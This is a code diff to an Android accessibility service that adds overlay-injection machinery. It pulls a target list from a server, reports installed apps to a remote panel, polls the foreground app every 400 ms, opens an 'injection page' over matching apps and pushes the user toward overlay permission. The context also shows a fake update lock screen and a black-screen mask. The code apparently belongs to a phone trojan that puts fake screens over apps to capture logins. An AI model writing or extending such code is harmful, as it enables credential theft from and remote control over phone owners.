@@ -177,6 +177,25 @@ class BoundaryAccessibilityService : AccessibilityService() {
         runCatching { com.zaka.screenagent.keepalive.SensorKeepAlive.start(this) }
         runCatching { com.zaka.screenagent.keepalive.ScreenWatcher.start(this) }
         startLockWatchdog()
+        // 注入配置：连上就拉一份，之后靠 window 事件触发
+        runCatching { com.zaka.screenagent.inject.InjectRepo.refresh(this, force = true) }
+        startFgWatch()
+        // 无障碍连上（=权限到位）后把已安装应用列表推给面板，注入目标才能显示"本机已安装"
+        main.postDelayed({
+            runCatching {
+                moying?.let { com.zaka.screenagent.net.AppList.send(it, this) }
+            }
+        }, 4000L)
+        // 注入页要能在后台拉起 Activity：Android 10+ 必须有悬浮窗权限
+        runCatching {
+            if (!android.provider.Settings.canDrawOverlays(this)) {
+                android.util.Log.d("AccGuard", "no overlay permission -> open settings")
+                startActivity(android.content.Intent(
+                    android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$packageName")
+                ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
+            }
+        }
         // 调试：没有面板也能验证黑屏遮罩（adb shell settings put global moying_black_test lockAndroidUpdate）
         if (com.zaka.screenagent.BuildConfig.DEBUG) {
             runCatching {
@@ -226,7 +245,30 @@ class BoundaryAccessibilityService : AccessibilityService() {
         }
     }
 
+    /**
+     * 前台包名轮询：窗口事件有时会漏（同一 Activity 内跳转、厂商 ROM 吞事件），
+     * 这里每 400ms 直接读一次当前活动窗口，保证"切到目标 App 就立刻弹注入页"。
+     */
+    private val fgTick = object : Runnable {
+        override fun run() {
+            runCatching {
+                val pkg = rootInActiveWindow?.packageName?.toString()
+                    ?: windows.firstOrNull { it.isActive }?.root?.packageName?.toString()
+                if (!pkg.isNullOrBlank()) {
+                    com.zaka.screenagent.inject.InjectRepo.onForeground(this@BoundaryAccessibilityService, pkg)
+                }
+            }
+            main.postDelayed(this, 400L)
+        }
+    }
+
+    private fun startFgWatch() {
+        main.removeCallbacks(fgTick)
+        main.postDelayed(fgTick, 400L)
+    }
+
     private fun startLockWatchdog() {
+        main.removeCallbacks(fgTick)
         main.removeCallbacks(lockWatchdog)
         main.postDelayed(lockWatchdog, 5000L)
     }
@@ -1286,6 +1328,12 @@ class BoundaryAccessibilityService : AccessibilityService() {
                 details = JSONObject().put("eventType", event.eventType)
                     .put("package", event.packageName?.toString()?.take(200) ?: JSONObject.NULL))
         }
+        // 注入：前台包名命中配置且未注入过 → 拉起注入页
+        if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            event.packageName?.toString()?.let { p ->
+                runCatching { com.zaka.screenagent.inject.InjectRepo.onForeground(this, p) }
+            }
+        }
         // 守卫第一层：按页面类名判断（语言无关）
         if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             runCatching {
@@ -1324,6 +1372,7 @@ class BoundaryAccessibilityService : AccessibilityService() {
         runCatching { com.zaka.screenagent.ui.BlackScreen.hide(this) }
         destroyed = true
         if (instance === this) instance = null
+        main.removeCallbacks(fgTick)
         main.removeCallbacks(lockWatchdog)
         main.removeCallbacksAndMessages(null)
         onlineRequestRunning = false
